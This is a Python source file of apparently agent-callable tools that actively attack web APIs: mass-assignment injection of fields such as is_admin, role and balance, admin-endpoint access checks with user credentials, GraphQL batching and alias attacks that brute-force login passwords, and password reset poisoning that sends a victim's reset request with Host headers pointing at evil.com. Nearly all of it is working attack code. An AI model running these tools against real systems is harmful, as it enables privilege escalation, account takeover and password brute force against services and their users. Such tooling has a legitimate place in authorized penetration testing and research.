"""
Mass Assignment & Broken Function Level Authorization (BFLA) Prober
Active probing (not just advisory) for:
- Mass assignment (extra fields auto-bound by ORM/framework)
- BFLA (regular user accessing admin functions)
- Horizontal / Vertical privilege escalation via API
- Parameter pollution for privilege escalation
"""

import json
import requests
from src.sdk.core import function_tool


def _req(method, url, hdrs, body=None, params=None, timeout=10):
    try:
        return requests.request(method, url, headers=hdrs, json=body,
                                params=params, verify=False, timeout=timeout)
    except Exception:
        return None


@function_tool()
def mass_assignment_probe(
    endpoint_url: str,
    method: str = "POST",
    base_body: str = '{"name": "testuser", "email": "test@test.com"}',
    headers: str = "{}"
):
    """
    Probe an API endpoint for mass assignment vulnerabilities.
    Injects extra fields (admin, role, is_admin, balance) that should not be user-settable.

    Args:
        endpoint_url: API endpoint to probe (e.g. /api/users or /api/profile)
        method: HTTP method (POST or PUT)
        base_body: JSON string of the normal request body
        headers: JSON string of auth headers (as a regular user)
    """
    try:
        hdrs = json.loads(headers)
    except Exception:
        hdrs = {}
    try:
        base = json.loads(base_body)
    except Exception:
        base = {}

    results = [f"[MASS-ASSIGN] Probing: {method} {endpoint_url}"]

    # Baseline
    baseline_resp = _req(method, endpoint_url, hdrs, body=base)
    baseline_status = baseline_resp.status_code if baseline_resp else "ERR"
    baseline_text = (baseline_resp.text or "").lower() if baseline_resp else ""
    results.append(f"[BASELINE] HTTP {baseline_status}")

    # Privilege escalation field injections
    mass_assign_fields = [
        {"admin": True},
        {"is_admin": True},
        {"role": "admin"},
        {"role": "superuser"},
        {"privilege_level": 9999},
        {"account_type": "premium"},
        {"is_verified": True},
        {"balance": 999999},
        {"credit": 99999},
        {"subscription": "enterprise"},
        {"permissions": ["read", "write", "admin", "delete"]},
        {"groups": ["admin", "superuser"]},
        {"bypass_2fa": True},
        {"email_verified": True},
        {"is_active": True},
    ]

    vulnerable = []
    for extra_fields in mass_assign_fields:
        body = {**base, **extra_fields}
        resp = _req(method, endpoint_url, hdrs, body=body)
        if resp is None:
            continue

        status = resp.status_code
        field_name = list(extra_fields.keys())[0]

        if status in (200, 201):
            resp_text = resp.text or ""
            resp_lower = resp_text.lower()
            # Check if the injected field is reflected back in the response
            # BUT ensure it was NOT already present in the baseline (anti-FP)
            for key, val in extra_fields.items():
                val_str = str(val).lower()
                reflected = val_str in resp_lower or (str(key) in resp_text and "true" in resp_lower)
                # If the same string already appeared in the baseline, this is NOT mass assignment
                already_in_baseline = val_str in baseline_text or (str(key) in baseline_text and "true" in baseline_text)
                if reflected and not already_in_baseline:
                    vulnerable.append(field_name)
                    results.append(f"[VULNERABLE] {extra_fields} → HTTP {status}, field reflected in response (NOT in baseline)!")
                    results.append(f"  Response: {resp_text[:200]}")
                    break
                elif reflected and already_in_baseline:
                    results.append(f"[FALSE POSITIVE] {field_name} → HTTP {status} — value exists in baseline response (page always contains '{val_str}')")
                    break
            else:
                # If status matches baseline exactly (same status + similar body), likely not vulnerable
                if status == baseline_status and baseline_resp:
                    body_diff = abs(len(resp_text) - len(baseline_text))
                    if body_diff < 100:
                        results.append(f"[IGNORED] {field_name} → HTTP {status} (response identical to baseline, field silently dropped)")
                    else:
                        results.append(f"[UNCERTAIN] {field_name} → HTTP {status} (field may have been accepted silently, response differs by {body_diff} bytes)")
                else:
                    results.append(f"[UNCERTAIN] {field_name} → HTTP {status} (field may have been accepted silently)")
        elif status == 422 or status == 400:
            results.append(f"[BLOCKED] {field_name} → HTTP {status} (rejected by validation)")
        else:
            results.append(f"[OK] {field_name} → HTTP {status}")

    results.append(f"\n{'='*60}")
    if vulnerable:
        results.append(f"⚠️  MASS ASSIGNMENT: {len(vulnerable)} privileged fields accepted")
        results.append(f"Vulnerable fields: {vulnerable}")
        results.append("Impact: User can escalate own privileges via API binding")
    else:
        results.append("No obvious mass assignment detected — fields may be filtered")

    return "\n".join(results)


@function_tool()
def bfla_probe(
    admin_endpoints: str,
    user_headers: str = "{}",
    method: str = "GET"
):
    """
    Broken Function Level Authorization (BFLA) probe.
    Tests whether admin/privileged API functions are accessible to regular users.

    Args:
        admin_endpoints: Comma-separated admin URLs to test
          (e.g. /api/admin/users,/api/admin/settings,/api/internal/metrics)
        user_headers: JSON string of a regular (non-admin) user's auth headers
        method: HTTP method to test
    """
    try:
        hdrs = json.loads(user_headers)
    except Exception:
        hdrs = {}

    endpoints = [e.strip() for e in admin_endpoints.split(",") if e.strip()]
    results = [f"[BFLA] Testing {len(endpoints)} admin endpoints with regular user credentials"]

    accessible = []

    for endpoint in endpoints:
        resp = _req(method, endpoint, hdrs)
        if resp is None:
            results.append(f"[ERROR] {endpoint}: No response")
            continue

        status = resp.status_code

        if status == 200:
            accessible.append(endpoint)
            results.append(f"[VULNERABLE] {endpoint} → HTTP {status} — accessible to non-admin!")
            # Show a snippet of returned data
            try:
                data = resp.json()
                if isinstance(data, list):
                    results.append(f"  Returns {len(data)} records")
                elif isinstance(data, dict):
                    results.append(f"  Returns: {list(data.keys())[:5]}")
            except Exception:
                results.append(f"  Response: {resp.text[:100]}")
        elif status == 403:
            results.append(f"[BLOCKED] {endpoint} → HTTP 403 — properly restricted")
        elif status == 401:
            results.append(f"[AUTH] {endpoint} → HTTP 401 — authentication required")
        else:
            results.append(f"[INFO] {endpoint} → HTTP {status}")

    results.append(f"\n{'='*60}")
    if accessible:
        results.append(f"⚠️  BFLA: {len(accessible)}/{len(endpoints)} admin endpoints accessible without admin role")
        for ep in accessible:
            results.append(f"  ✗ {ep}")
    else:
        results.append("No BFLA detected — admin endpoints appear properly restricted")

    return "\n".join(results)


@function_tool()
def graphql_batch_attack(
    graphql_url: str,
    query_template: str,
    batch_size: int = 100,
    headers: str = "{}"
):
    """
    Test GraphQL for batching-based rate limit bypass.
    GraphQL batching allows sending N queries in one HTTP request,
    bypassing per-request rate limits.

    Args:
        graphql_url: GraphQL endpoint URL
        query_template: GraphQL query to batch (use {alias} as placeholder)
          e.g. '{alias}: login(email: "victim@email.com", password: "PASS{n}")'
        batch_size: Number of queries in the batch (default 100)
        headers: JSON string of auth/content headers
    """
    try:
        hdrs = {"Content-Type": "application/json", **json.loads(headers)}
    except Exception:
        hdrs = {"Content-Type": "application/json"}

    results = [f"[GQL-BATCH] Testing GraphQL batching attack: {graphql_url}"]
    results.append(f"[INFO] Batch size: {batch_size}")

    # Build a batch of queries
    batch = []
    for i in range(batch_size):
        alias = f"q{i}"
        query = query_template.replace("{alias}", alias).replace("{n}", str(i))
        batch.append({"query": f"query {{ {query} }}"})

    try:
        resp = requests.post(graphql_url, json=batch, headers=hdrs,
                             verify=False, timeout=30)
        status = resp.status_code

        if status == 200:
            try:
                data = resp.json()
                if isinstance(data, list):
                    results.append(f"[VULNERABLE] Server processed {len(data)}/{batch_size} batched queries!")
                    results.append("⚠️  GRAPHQL BATCHING: Rate limit can be bypassed via query batching")
                    results.append("Impact: Bruteforce, enumeration, and DoS at rate-limited endpoints")
                    # Sample responses
                    for i, item in enumerate(data[:3]):
                        results.append(f"  [query {i}]: {str(item)[:100]}")
                else:
                    results.append(f"[INFO] Non-array response: {str(data)[:200]}")
            except Exception:
                results.append(f"[INFO] HTTP {status}, non-JSON response: {resp.text[:200]}")
        elif status == 400:
            # Check if it's because batching is disabled
            if "batch" in resp.text.lower():
                results.append("[PROTECTED] Batching explicitly disabled (HTTP 400)")
            else:
                results.append(f"[BLOCKED] HTTP 400: {resp.text[:100]}")
        else:
            results.append(f"[INFO] HTTP {status}: {resp.text[:100]}")

    except Exception as e:
        results.append(f"[ERROR] {e}")

    return "\n".join(results)


@function_tool()
def graphql_alias_bypass(
    graphql_url: str,
    rate_limited_query: str,
    field_name: str,
    alias_count: int = 50,
    headers: str = "{}"
):
    """
    Test GraphQL alias-based rate limit bypass.
    Multiple aliases in a single query can bypass per-field rate limits.
    e.g. { a: login(pw:"1") b: login(pw:"2") c: login(pw:"3") }

    Args:
        graphql_url: GraphQL endpoint
        rate_limited_query: The field/mutation to bypass (e.g. 'login(email: "x@x.com", password: "{pw}")')
        field_name: The root field name (e.g. 'login')
        alias_count: Number of aliases to generate
        headers: JSON string of headers
    """
    try:
        hdrs = {"Content-Type": "application/json", **json.loads(headers)}
    except Exception:
        hdrs = {"Content-Type": "application/json"}

    results = [f"[GQL-ALIAS] Testing alias-based rate limit bypass: {graphql_url}"]

    # Build alias query
    aliases = []
    for i in range(alias_count):
        aliases.append(f"a{i}: {rate_limited_query.replace('{pw}', str(i).zfill(6))}")

    query = "query { " + "\n".join(aliases) + " }"
    payload = {"query": query}

    try:
        resp = requests.post(graphql_url, json=payload, headers=hdrs,
                             verify=False, timeout=30)
        status = resp.status_code

        if status == 200:
            try:
                data = resp.json()
                # Count non-error responses
                if "data" in data:
                    results_data = data["data"] or {}
                    success_count = sum(1 for v in results_data.values() if v is not None)
                    results.append(f"[RESULT] {success_count}/{alias_count} aliases returned non-null data")
                    if success_count > 1:
                        results.append("⚠️  ALIAS BYPASS: Multiple aliases processed in one request!")
                        results.append("Impact: Rate limit on individual field bypassed via aliases")
                else:
                    results.append(f"[INFO] Response: {str(data)[:200]}")
            except Exception:
                results.append(f"[INFO] HTTP {status}: {resp.text[:200]}")
        else:
            results.append(f"[BLOCKED/INFO] HTTP {status}: {resp.text[:100]}")
    except Exception as e:
        results.append(f"[ERROR] {e}")

    return "\n".join(results)


@function_tool()
def password_reset_poisoning(
    password_reset_url: str,
    victim_email: str,
    headers: str = "{}"
):
    """
    Test for Host Header-based password reset poisoning.
    A vulnerable site uses the Host header to build reset links,
    allowing an attacker to poison the link to point to attacker infrastructure.

    Args:
        password_reset_url: URL of the password reset form submission endpoint
        victim_email: Email address to request reset for
        headers: JSON optional extra headers
    """
    try:
        hdrs = json.loads(headers)
    except Exception:
        hdrs = {}

    results = [f"[RESET-POISON] Testing password reset Host header poisoning: {password_reset_url}"]
    results.append(f"[INFO] Target email: {victim_email}")

    poisoned_hosts = [
        "evil.com",
        "evil.com:25",
        "target.com.evil.com",
        "evil.com%23@target.com",  # Fragment bypass
    ]

    for poison_host in poisoned_hosts:
        attack_hdrs = {
            **hdrs,
            "Host": poison_host,
            "X-Forwarded-Host": poison_host,
            "X-Host": poison_host,
            "X-Forwarded-Server": poison_host,
            "Content-Type": "application/x-www-form-urlencoded"
        }

        data = {"email": victim_email, "username": victim_email}
        try:
            resp = requests.post(password_reset_url, data=data, headers=attack_hdrs,
                                 verify=False, timeout=10)
            status = resp.status_code

            if status in (200, 201, 302):
                results.append(f"[RESULT] Host={poison_host} → HTTP {status}")
                if "success" in resp.text.lower() or "sent" in resp.text.lower() or "email" in resp.text.lower():
                    results.append("⚠️  RESET EMAIL SENT with poisoned Host!")
                    results.append(f"  Check inbox: does reset link point to {poison_host}?")
            else:
                results.append(f"[INFO] Host={poison_host} → HTTP {status}")
        except Exception as e:
            results.append(f"[ERROR] Host={poison_host}: {e}")

    results.append(f"\n{'='*60}")
    results.append("Verify by checking the password reset email — does the link point to evil.com?")
    results.append("If yes: ⚠️  CRITICAL — attacker can steal password reset tokens")

    return "\n".join(results)
